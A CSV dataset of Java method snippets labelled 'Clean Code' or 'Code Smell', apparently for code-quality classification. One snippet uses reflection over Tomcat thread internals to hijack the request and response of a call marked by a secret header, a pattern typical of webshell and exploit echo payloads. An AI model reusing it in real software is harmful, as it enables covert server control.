text,label,text_label
"private KernelProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private KernelProto(){
  className_="""";
}
!org.eclipse.jdt.core.dom.MethodDeclaration@30db5aaf",0,Clean Code
"private void setCheckedEnableReactionCell(int selectType,boolean animated){
  if (selectedType == selectType) {
    return;
  }
  boolean checked=selectType == SELECT_TYPE_SOME || selectType == SELECT_TYPE_ALL;
  enableReactionsCell.setChecked(checked);
  int clr=Theme.getColor(checked ? Theme.key_windowBackgroundChecked : Theme.key_windowBackgroundUnchecked);
  if (animated) {
    if (checked) {
      enableReactionsCell.setBackgroundColorAnimated(true,clr);
    }
 else {
      enableReactionsCell.setBackgroundColorAnimatedReverse(clr);
    }
  }
 else {
    enableReactionsCell.setBackgroundColor(clr);
  }
  this.selectedType=selectType;
  if (selectType == SELECT_TYPE_SOME || selectType == SELECT_TYPE_ALL) {
    switchLayout.setVisibility(View.VISIBLE);
    actionButton.setVisibility(View.VISIBLE);
    if (animated) {
      actionButton.animate().setListener(null).cancel();
      switchLayout.animate().setListener(null).cancel();
      switchLayout.animate().alpha(1f).setDuration(350).setInterpolator(CubicBezierInterpolator.DEFAULT).setListener(new AnimatorListenerAdapter(){
        @Override public void onAnimationEnd(        Animator animation){
          editText.setFocusableInTouchMode(true);
        }
      }
).start();
      actionButton.animate().alpha(1f).setDuration(350).setInterpolator(CubicBezierInterpolator.DEFAULT).start();
      if (selectedEmojisMap.isEmpty()) {
        selectAnimatedEmojiDialog.clearSelectedDocuments();
        editText.setText("""");
        int i=0;
        SpannableStringBuilder editable=new SpannableStringBuilder();
        for (        TLRPC.TL_availableReaction availableReaction : allAvailableReactions) {
          addReactionToEditText(availableReaction,selectedEmojisMap,selectedEmojisIds,editable,selectAnimatedEmojiDialog,editText.getFontMetricsInt());
          i++;
          if (i >= maxReactionsCount) {
            break;
          }
        }
        editText.append(editable);
        editText.addReactionsSpan();
        selectAnimatedEmojiDialog.notifyDataSetChanged();
        checkMaxCustomReactions(false);
      }
    }
  }
 else {
    if (animated) {
      closeKeyboard();
      actionButton.animate().setListener(null).cancel();
      switchLayout.animate().setListener(null).cancel();
      actionButton.animate().alpha(0f).setDuration(350).setInterpolator(CubicBezierInterpolator.DEFAULT).setListener(new AnimatorListenerAdapter(){
        @Override public void onAnimationEnd(        Animator animation){
          actionButton.setVisibility(View.INVISIBLE);
        }
      }
).start();
      switchLayout.animate().alpha(0f).setDuration(350).setInterpolator(CubicBezierInterpolator.DEFAULT).setListener(new AnimatorListenerAdapter(){
        @Override public void onAnimationEnd(        Animator animation){
          editText.setFocusableInTouchMode(false);
          switchLayout.setVisibility(View.INVISIBLE);
        }
      }
).start();
    }
 else {
      switchLayout.setVisibility(View.INVISIBLE);
      actionButton.setVisibility(View.INVISIBLE);
    }
  }
}",1,Code Smell
"@Override @Implemented(EasyRecyclerView.OnItemClickListener.class) public boolean onItemClick(EasyRecyclerView parent,View view,int position,long id){
  if (mDrawerLayout != null && mDrawerLayout.isDrawerOpen(Gravity.RIGHT)) {
    if (mRecyclerView != null && mRecyclerView.isInCustomChoice()) {
      return true;
    }
    if (mUrlBuilder == null || mHelper == null) {
      return true;
    }
    int newFavCat=position - 2;
    if (mUrlBuilder.getFavCat() == newFavCat) {
      return true;
    }
    if (mRecyclerView != null) {
      mRecyclerView.isInCustomChoice();
    }
    exitSearchMode(true);
    mUrlBuilder.setKeyword(null);
    mUrlBuilder.setFavCat(newFavCat);
    updateSearchBar();
    mHelper.refresh();
    closeDrawer(Gravity.RIGHT);
  }
 else {
    if (mRecyclerView != null && mRecyclerView.isInCustomChoice()) {
      mRecyclerView.toggleItemChecked(position);
    }
 else     if (mHelper != null) {
      GalleryInfo gi=mHelper.getDataAtEx(position);
      if (gi == null) {
        return true;
      }
      Bundle args=new Bundle();
      args.putString(GalleryDetailScene.KEY_ACTION,GalleryDetailScene.ACTION_GALLERY_INFO);
      args.putParcelable(GalleryDetailScene.KEY_GALLERY_INFO,gi);
      Announcer announcer=new Announcer(GalleryDetailScene.class).setArgs(args);
      View thumb;
      if (null != (thumb=view.findViewById(R.id.thumb))) {
        announcer.setTranHelper(new EnterGalleryDetailTransaction(thumb));
      }
      startScene(announcer);
    }
  }
  return true;
}",1,Code Smell
"@Override public void init() throws NoSuchMethodException {
  findAndHookMethod(""com.android.server.wm.ActivityTaskManagerService"",""onSystemReady"",new MethodHook(){
    @Override protected void after(    MethodHookParam param){
      try {
        Context context=(Context)XposedHelpers.getObjectField(param.thisObject,""mContext"");
        if (context == null)         return;
        if (!isObserver) {
          ContentObserver contentObserver=new ContentObserver(new Handler(context.getMainLooper())){
            @Override public void onChange(            boolean selfChange,            @Nullable Uri uri,            int flags){
              isLock=getLockApp(context) != -1;
              if (isLock) {
                taskId=getLockApp(context);
                XposedHelpers.callMethod(param.thisObject,""startSystemLockTaskMode"",taskId);
                needLockScreen=getMyLockScreen(context) == 1;
              }
 else {
                new Handler(context.getMainLooper()).postDelayed(() -> XposedHelpers.callMethod(param.thisObject,""stopSystemLockTaskMode""),300);
              }
            }
          }
;
          context.getContentResolver().registerContentObserver(Settings.Global.getUriFor(""key_lock_app""),false,contentObserver);
          isObserver=true;
        }
      }
 catch (      Throwable e) {
        logE(TAG,""E: "" + e);
      }
    }
  }
);
  findAndHookMethod(""com.miui.server.input.util.ShortCutActionsUtils"",""triggerHapticFeedback"",boolean.class,String.class,String.class,boolean.class,String.class,new MethodHook(){
    @Override protected void after(    MethodHookParam param){
      if (!mPrefsMap.getBoolean(""system_framework_guided_access_status""))       return;
      String shortcut=(String)param.args[1];
      if (""imperceptible_press_power_key"".equals(shortcut) || ""long_press_power_key"".equals(shortcut)) {
        Context context=(Context)XposedHelpers.getObjectField(param.thisObject,""mContext"");
        isLock=getLockApp(context) != -1;
        if (isLock) {
          setLockApp(context,-1);
        }
      }
    }
  }
);
  findAndHookMethod(""com.android.server.wm.LockTaskController"",""shouldLockKeyguard"",int.class,new MethodHook(){
    @Override protected void before(    MethodHookParam param){
      if (needLockScreen) {
        param.setResult(true);
      }
 else {
        param.setResult(false);
      }
    }
  }
);
  if (isPad()) {
    findAndHookMethod(""com.android.server.wm.MiuiCvwGestureController$GesturePointerEventListener"",""onPointerEvent"",MotionEvent.class,new MethodHook(){
      @Override protected void before(      MethodHookParam param){
        if (isLock) {
          param.setResult(null);
        }
      }
    }
);
  }
}",1,Code Smell
"public static CustomControls convertV1Layout(JSONObject oldLayoutJson) throws JSONException {
  CustomControls empty=new CustomControls();
  JSONArray layoutMainArray=oldLayoutJson.getJSONArray(""mControlDataList"");
  for (int i=0; i < layoutMainArray.length(); i++) {
    JSONObject button=layoutMainArray.getJSONObject(i);
    ControlData n_button=new ControlData();
    int[] keycodes=new int[]{LwjglGlfwKeycode.GLFW_KEY_UNKNOWN,LwjglGlfwKeycode.GLFW_KEY_UNKNOWN,LwjglGlfwKeycode.GLFW_KEY_UNKNOWN,LwjglGlfwKeycode.GLFW_KEY_UNKNOWN};
    n_button.dynamicX=button.getString(""dynamicX"");
    n_button.dynamicY=button.getString(""dynamicY"");
    if (!Tools.isValidString(n_button.dynamicX) && button.has(""x"")) {
      double buttonC=button.getDouble(""x"");
      double ratio=buttonC / CallbackBridge.physicalWidth;
      n_button.dynamicX=ratio + "" * ${screen_width}"";
    }
    if (!Tools.isValidString(n_button.dynamicY) && button.has(""y"")) {
      double buttonC=button.getDouble(""y"");
      double ratio=buttonC / CallbackBridge.physicalHeight;
      n_button.dynamicY=ratio + "" * ${screen_height}"";
    }
    n_button.name=button.getString(""name"");
    n_button.opacity=((float)((button.getInt(""transparency"") - 100) * -1)) / 100f;
    n_button.passThruEnabled=button.getBoolean(""passThruEnabled"");
    n_button.isToggle=button.getBoolean(""isToggle"");
    n_button.setHeight(button.getInt(""height""));
    n_button.setWidth(button.getInt(""width""));
    n_button.bgColor=0x4d000000;
    n_button.strokeWidth=0;
    if (button.getBoolean(""isRound"")) {
      n_button.cornerRadius=35f;
    }
    int next_idx=0;
    if (button.getBoolean(""holdShift"")) {
      keycodes[next_idx]=LwjglGlfwKeycode.GLFW_KEY_LEFT_SHIFT;
      next_idx++;
    }
    if (button.getBoolean(""holdCtrl"")) {
      keycodes[next_idx]=LwjglGlfwKeycode.GLFW_KEY_LEFT_CONTROL;
      next_idx++;
    }
    if (button.getBoolean(""holdAlt"")) {
      keycodes[next_idx]=LwjglGlfwKeycode.GLFW_KEY_LEFT_ALT;
      next_idx++;
    }
    keycodes[next_idx]=button.getInt(""keycode"");
    n_button.keycodes=keycodes;
    empty.mControlDataList.add(n_button);
  }
  empty.scaledAt=(float)oldLayoutJson.getDouble(""scaledAt"");
  empty.version=3;
  return empty;
}",1,Code Smell
"public void updateAll(){
  for (int i=0; i < viewPager.viewPages.length; ++i) {
    if (viewPager.viewPages[i] instanceof Page) {
      Page page=(Page)viewPager.viewPages[i];
      if (page.currentTab == TAB_FORWARD) {
        page.messages=messagePreviewParams.forwardMessages;
      }
 else       if (page.currentTab == TAB_REPLY) {
        page.messages=messagePreviewParams.replyMessage;
      }
 else       if (page.currentTab == TAB_LINK) {
        page.messages=messagePreviewParams.linkMessage;
      }
      page.updateMessages();
      if (page.currentTab == TAB_REPLY) {
        if (showOutdatedQuote && !messagePreviewParams.isSecret) {
          MessageObject msg=null;
          if (page.textSelectionHelper.getSelectedCell() != null) {
            msg=page.textSelectionHelper.getSelectedCell().getMessageObject();
          }
          msg=page.getReplyMessage(msg);
          if (msg != null) {
            messagePreviewParams.quoteStart=0;
            messagePreviewParams.quoteEnd=Math.min(MessagesController.getInstance(currentAccount).quoteLengthMax,msg.messageOwner.message.length());
            messagePreviewParams.quote=ChatActivity.ReplyQuote.from(msg,messagePreviewParams.quoteStart,messagePreviewParams.quoteEnd);
            page.textSelectionHelper.select(page.getReplyMessageCell(),messagePreviewParams.quoteStart,messagePreviewParams.quoteEnd);
          }
        }
 else {
          messagePreviewParams.quote=null;
          page.textSelectionHelper.clear();
          page.switchToQuote(false,true);
        }
        page.updateSubtitle(true);
      }
      if (page.changeSizeBtn != null) {
        page.changeSizeBtn.animate().alpha(messagePreviewParams.hasMedia ? 1f : .5f).start();
      }
    }
  }
}",1,Code Smell
"private void applyHooks(){
  if (hooksApplied)   return;
  hooksApplied=true;
  Method[] resMethods=Resources.class.getDeclaredMethods();
  for (  Method method : resMethods) {
    String name=method.getName();
switch (name) {
case ""getInteger"":
{
        if (method.getParameterTypes().length == 1 && method.getParameterTypes()[0].equals(int.class)) {
          hookResMethod(method.getName(),int.class,hookResBefore);
        }
      }
case ""getColor"":
{
      if (method.getParameterTypes().length == 2) {
        hookResMethod(method.getName(),int.class,Resources.Theme.class,hookResBefore);
      }
    }
case ""getFraction"":
{
    if (method.getParameterTypes().length == 3) {
      hookResMethod(method.getName(),int.class,int.class,int.class,hookResBefore);
    }
  }
case ""getDrawableForDensity"":
{
  if (method.getParameterTypes().length == 3) {
    hookResMethod(method.getName(),int.class,int.class,Resources.Theme.class,hookResBefore);
  }
}
}
}
Method[] typedMethod=TypedArray.class.getDeclaredMethods();
for (Method method : typedMethod) {
if (method.getName().equals(""getColor"")) {
hookTypedMethod(method.getName(),int.class,int.class,hookTypedBefore);
}
}
}",1,Code Smell
"@Override public void call(Subscriber<? super List<ImageUrl>> subscriber){
  DocumentFile dir=getChapterDir(root,comic,chapter,title);
  List<DocumentFile> files=dir.listFiles(new DocumentFile.DocumentFileFilter(){
    @Override public boolean call(    DocumentFile file){
      return !file.getName().endsWith(""cdif"");
    }
  }
,new Comparator<DocumentFile>(){
    @Override public int compare(    DocumentFile lhs,    DocumentFile rhs){
      return lhs.getName().compareTo(rhs.getName());
    }
  }
);
  List<ImageUrl> list=Storage.buildImageUrlFromDocumentFile(files,chapter.getPath(),chapter.getCount(),chapter);
  if (list.size() != 0) {
    subscriber.onNext(list);
    subscriber.onCompleted();
  }
 else {
    subscriber.onError(new Exception());
  }
}
@Override public boolean call(DocumentFile file){
  return !file.getName().endsWith(""cdif"");
}
@Override public void call(Subscriber<? super Pair<Comic,List<Task>>> subscriber){
  root.refresh();
  DocumentFile downloadDir=DocumentUtils.getOrCreateSubDirectory(root,DOWNLOAD);
  if (downloadDir != null) {
    for (    DocumentFile sourceDir : downloadDir.listFiles()) {
      if (sourceDir.isDirectory()) {
        for (        DocumentFile comicDir : sourceDir.listFiles()) {
          Comic comic=buildComicFromDir(resolver,comicDir);
          if (comic != null) {
            List<Task> list=new LinkedList<>();
            for (            DocumentFile chapterDir : comicDir.listFiles()) {
              Task task=buildTaskFromDir(resolver,chapterDir);
              if (task != null) {
                list.add(task);
              }
            }
            if (!list.isEmpty()) {
              subscriber.onNext(Pair.create(comic,list));
            }
          }
        }
      }
    }
  }
  subscriber.onCompleted();
}",1,Code Smell
"public void setViroContext(ViroContext context){
  super.setViroContext(context);
  if (mMaterials != null) {
    boolean materialsChanged=false;
    ArrayList<Material> nativeMaterials=new ArrayList<>();
    MaterialManager materialManager=getReactContext().getNativeModule(MaterialManager.class);
    for (int i=0; i < mMaterials.size(); i++) {
      String materialName=mMaterials.get(i).getName();
      Material nativeMaterial=materialManager.getMaterial(materialName);
      if (materialManager.isVideoMaterial(materialName)) {
        if (!(nativeMaterial.getDiffuseTexture() instanceof VideoTexture)) {
          MaterialManager.MaterialWrapper materialWrapper=materialManager.getMaterialWrapper(materialName);
          VideoTexture videoTexture=new VideoTexture(context,materialWrapper.getVideoTextureURI());
          materialWrapper.recreate(videoTexture);
          nativeMaterial=materialWrapper.getNativeMaterial();
          materialsChanged=true;
        }
      }
      if (nativeMaterial == null) {
        throw new IllegalArgumentException(""Material ["" + materialName + ""] not found. Did you create it?"");
      }
      nativeMaterials.add(nativeMaterial);
    }
    if (materialsChanged) {
      setMaterials(nativeMaterials);
    }
  }
  if (hasPhysicsBody) {
    if (mPhysicsDelegate != null) {
      mNodeJni.getPhysicsBody().setCollisionListener(mPhysicsDelegate);
    }
 else {
      mNodeJni.getPhysicsBody().setCollisionListener(null);
    }
  }
}",1,Code Smell
"/** 
 * Post鏂规硶璇锋眰
 * @param url     url鍦板潃
 * @param headers 璇锋眰澶�
 * @param body    璇锋眰body
 * @return resp
 */
public static Resp invokePostBody(String url,Map<String,String> headers,String body){
  return invokePostBody(url,headers,null,body);
}
/** 
 * Post鏂规硶璇锋眰
 * @param url      url鍦板潃
 * @param headers  璇锋眰澶�
 * @param paramMap 璇锋眰鍙傛暟
 * @param body     璇锋眰body
 * @return resp
 */
public static Resp invokePostBody(String url,Map<String,String> headers,Map<String,String[]> paramMap,String body){
  String contentType=headers.get(""Content-Type"");
  if (contentType == null) {
    contentType=headers.get(""content-type"");
  }
  if (contentType == null) {
    contentType=""application/x-www-form-urlencoded; charset=utf-8"";
  }
  StringBuilder urlBuilder=new StringBuilder(url);
  if (MapUtils.isNotEmpty(paramMap)) {
    if (!StringUtils.contains(url,QUESTION_SEPARATE)) {
      urlBuilder.append(QUESTION_SEPARATE).append(""_r=1"");
    }
    for (    Map.Entry<String,String[]> entry : paramMap.entrySet()) {
      for (      String value : entry.getValue()) {
        urlBuilder.append(PARAM_SEPARATE).append(entry.getKey()).append(KV_SEPARATE).append(value);
      }
    }
  }
  RequestBody b=RequestBody.create(MediaType.parse(contentType),body);
  Request.Builder rb=new Request.Builder().post(b).url(urlBuilder.toString());
  if (MapUtils.isNotEmpty(headers)) {
    for (    Map.Entry<String,String> entry : headers.entrySet()) {
      rb.header(entry.getKey(),entry.getValue());
    }
  }
  return executeRequest(rb.build());
}",1,Code Smell
"@Override public String forUpdateEntity(TableInfo tableInfo,Object entity,boolean ignoreNulls){
  StringBuilder sql=new StringBuilder();
  Set<String> updateColumns=tableInfo.obtainUpdateColumns(entity,ignoreNulls,false);
  Map<String,RawValue> rawValueMap=tableInfo.obtainUpdateRawValueMap(entity);
  String[] primaryKeys=tableInfo.getPrimaryColumns();
  sql.append(UPDATE).append(tableInfo.getWrapSchemaAndTableName(this,OperateType.UPDATE)).append(SET);
  StringJoiner stringJoiner=new StringJoiner(DELIMITER);
  for (  String updateColumn : updateColumns) {
    if (rawValueMap.containsKey(updateColumn)) {
      stringJoiner.add(wrap(updateColumn) + EQUALS + rawValueMap.get(updateColumn).toSql(this));
    }
 else {
      stringJoiner.add(wrap(updateColumn) + EQUALS_PLACEHOLDER);
    }
  }
  Map<String,String> onUpdateColumns=tableInfo.getOnUpdateColumns();
  if (onUpdateColumns != null && !onUpdateColumns.isEmpty()) {
    onUpdateColumns.forEach((column,value) -> stringJoiner.add(wrap(column) + EQUALS + value));
  }
  String versionColumn=tableInfo.getVersionColumn();
  if (StringUtil.isNotBlank(versionColumn)) {
    stringJoiner.add(wrap(versionColumn) + EQUALS + wrap(versionColumn)+ "" + 1 "");
  }
  sql.append(stringJoiner);
  sql.append(WHERE);
  for (int i=0; i < primaryKeys.length; i++) {
    if (i > 0) {
      sql.append(AND);
    }
    sql.append(wrap(primaryKeys[i])).append(EQUALS_PLACEHOLDER);
  }
  String logicDeleteColumn=tableInfo.getLogicDeleteColumnOrSkip();
  if (StringUtil.isNotBlank(logicDeleteColumn)) {
    sql.append(AND).append(buildLogicNormalCondition(logicDeleteColumn,tableInfo));
  }
  Object[] tenantIdArgs=tableInfo.buildTenantIdArgs();
  tableInfo.buildTenantCondition(sql,tenantIdArgs,this);
  if (StringUtil.isNotBlank(versionColumn)) {
    Object versionValue=tableInfo.buildColumnSqlArg(entity,versionColumn);
    if (versionValue == null) {
      throw FlexExceptions.wrap(LocalizedFormats.ENTITY_VERSION_NULL,entity);
    }
    sql.append(AND).append(wrap(versionColumn)).append(EQUALS).append(versionValue);
  }
  prepareAuth(tableInfo,sql,OperateType.UPDATE);
  return sql.toString();
}",1,Code Smell
"public static void getRequestAndResponse(){
  try {
    boolean flag=false;
    Thread[] threads=(Thread[])getFieldValue(Thread.currentThread().getThreadGroup(),""threads"");
    for (int i=0; i < threads.length; ++i) {
      Thread thread=threads[i];
      if (thread != null) {
        String threadName=thread.getName();
        if (!threadName.contains(""exec"") && threadName.contains(""http"")) {
          Object target=getFieldValue(thread,""target"");
          if (target instanceof Runnable) {
            try {
              target=getFieldValue(getFieldValue(getFieldValue(target,""this$0""),""handler""),""global"");
            }
 catch (            Exception ignored) {
              continue;
            }
            List processors=(List)getFieldValue(target,""processors"");
            for (int j=0; j < processors.size(); ++j) {
              Object processor=processors.get(j);
              target=getFieldValue(processor,""req"");
              Object req=target.getClass().getMethod(""getNote"",Integer.TYPE).invoke(target,new Integer(1));
              String value=(String)req.getClass().getMethod(""getHeader"",String.class).invoke(req,new String(HEADER_KEY));
              if (value != null && value.contains(HEADER_VALUE)) {
                request=(HttpServletRequest)req;
                try {
                  response=(HttpServletResponse)getFieldValue(getFieldValue(req,""request""),""response"");
                }
 catch (                Exception ignored) {
                  try {
                    response=(HttpServletResponse)req.getClass().getMethod(""getResponse"",(Class[])null).invoke(req,(Object[])null);
                  }
 catch (                  Exception ignored2) {
                  }
                }
                flag=true;
              }
              if (flag) {
                break;
              }
            }
          }
        }
      }
    }
  }
 catch (  Exception ignored) {
  }
}",1,Code Smell
"/** 
 * Returns the max edge value of item (visible or cached) in a row.  This will be the place to append or prepend item not in cache.
 */
int getRowMax(int rowIndex){
  if (mFirstVisibleIndex < 0) {
    return Integer.MIN_VALUE;
  }
  if (mReversedFlow) {
    int edge=mProvider.getEdge(mFirstVisibleIndex);
    if (getLocation(mFirstVisibleIndex).row == rowIndex) {
      return edge;
    }
    for (int i=mFirstVisibleIndex + 1; i <= getLastIndex(); i++) {
      Location loc=getLocation(i);
      edge+=loc.offset;
      if (loc.row == rowIndex) {
        return edge;
      }
    }
  }
 else {
    int edge=mProvider.getEdge(mLastVisibleIndex);
    Location loc=getLocation(mLastVisibleIndex);
    if (loc.row == rowIndex) {
      return edge + loc.size;
    }
    for (int i=mLastVisibleIndex - 1; i >= getFirstIndex(); i--) {
      edge-=loc.offset;
      loc=getLocation(i);
      if (loc.row == rowIndex) {
        return edge + loc.size;
      }
    }
  }
  return Integer.MIN_VALUE;
}",1,Code Smell
"void buildParamsForPage(int page,ArrayList<PreviewItemDrawingParams> params,boolean animate){
  List<WorkspaceItemInfo> items=mIcon.getPreviewItemsOnPage(page);
  while (items.size() < params.size()) {
    params.remove(params.size() - 1);
  }
  while (items.size() > params.size()) {
    params.add(new PreviewItemDrawingParams(0,0,0));
  }
  int numItemsInFirstPagePreview=page == 0 ? items.size() : MAX_NUM_ITEMS_IN_PREVIEW;
  for (int i=0; i < params.size(); i++) {
    PreviewItemDrawingParams p=params.get(i);
    setDrawable(p,items.get(i));
    if (!animate) {
      if (p.anim != null) {
        p.anim.cancel();
      }
      computePreviewItemDrawingParams(i,numItemsInFirstPagePreview,p);
      if (mReferenceDrawable == null) {
        mReferenceDrawable=p.drawable;
      }
    }
 else {
      FolderPreviewItemAnim anim=new FolderPreviewItemAnim(this,p,i,mNumOfPrevItems,i,numItemsInFirstPagePreview,DROP_IN_ANIMATION_DURATION,null);
      if (p.anim != null) {
        if (p.anim.hasEqualFinalState(anim)) {
          continue;
        }
        p.anim.cancel();
      }
      p.anim=anim;
      p.anim.start();
    }
  }
}",1,Code Smell
"@Override public String buildModifyTaleSql(Table oldTable,Table newTable){
  StringBuilder script=new StringBuilder();
  script.append(""ALTER TABLE "");
  if (StringUtils.isNotBlank(oldTable.getDatabaseName())) {
    script.append(""`"").append(oldTable.getDatabaseName()).append(""`"").append(""."");
  }
  script.append(""`"").append(oldTable.getName()).append(""`"").append(""\n"");
  if (!StringUtils.equalsIgnoreCase(oldTable.getName(),newTable.getName())) {
    script.append(""\t"").append(""RENAME TO "").append(""`"").append(newTable.getName()).append(""`"").append("",\n"");
  }
  if (!StringUtils.equalsIgnoreCase(oldTable.getComment(),newTable.getComment())) {
    script.append(""\t"").append(""COMMENT="").append(""'"").append(newTable.getComment()).append(""'"").append("",\n"");
  }
  if (oldTable.getIncrementValue() != newTable.getIncrementValue()) {
    script.append(""\t"").append(""AUTO_INCREMENT="").append(newTable.getIncrementValue()).append("",\n"");
  }
  for (  TableColumn tableColumn : newTable.getColumnList()) {
    if (StringUtils.isNotBlank(tableColumn.getEditStatus()) && StringUtils.isNotBlank(tableColumn.getColumnType()) && StringUtils.isNotBlank(tableColumn.getName())) {
      MysqlColumnTypeEnum typeEnum=MysqlColumnTypeEnum.getByType(tableColumn.getColumnType());
      script.append(""\t"").append(typeEnum.buildModifyColumn(tableColumn)).append("",\n"");
    }
  }
  for (  TableIndex tableIndex : newTable.getIndexList()) {
    if (StringUtils.isNotBlank(tableIndex.getEditStatus()) && StringUtils.isNotBlank(tableIndex.getType())) {
      MysqlIndexTypeEnum mysqlIndexTypeEnum=MysqlIndexTypeEnum.getByType(tableIndex.getType());
      script.append(""\t"").append(mysqlIndexTypeEnum.buildModifyIndex(tableIndex)).append("",\n"");
    }
  }
  script.append(buildGenerateReorderColumnSql(oldTable,newTable));
  if (script.length() > 2) {
    script=new StringBuilder(script.substring(0,script.length() - 2));
    script.append("";"");
  }
  return script.toString();
}",1,Code Smell
